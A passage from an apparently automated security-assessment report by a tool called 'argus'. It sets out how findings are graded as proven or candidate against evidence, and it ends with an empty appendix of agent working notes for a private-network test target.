baseline-diffed) -> verification -> evidence-gated findings.
The complete request/response transcript is in `transcript.jsonl`,
(23 entries). Working notes are in `notes.md`.

Every finding is graded against the proof requirement for its class
(`argus proof <class>`): **proven** means the class-specific artifact
and its control are both on record; **candidate** means a real signal
with a named check still missing. A candidate is reported because it
is worth re-testing, not because it is a result.

_All findings cite verbatim response excerpts verified against the
recorded transcript at write time._

<details><summary>Appendix: agent working notes (audit)</summary>

```
# Working notes - http://192.168.223.221:8080


```
</details>